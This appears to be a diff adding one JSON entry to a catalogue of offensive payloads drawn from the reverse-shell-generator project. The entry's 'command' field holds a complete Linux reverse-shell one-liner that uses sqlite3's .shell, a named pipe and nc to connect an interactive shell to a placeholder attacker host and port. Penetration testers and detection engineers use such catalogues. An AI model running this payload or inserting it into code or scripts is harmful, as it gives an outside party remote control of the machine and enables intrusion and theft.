@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-sqlite3-nc-mkfifo",
+  "name": "RSG · ReverseShell · sqlite3 nc mkfifo",
+  "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <lhost> <lport> >/tmp/f'",
+  "description": "Reverse Shell payload — sqlite3 nc mkfifo (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/sqlite3 nc mkfifo/54",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
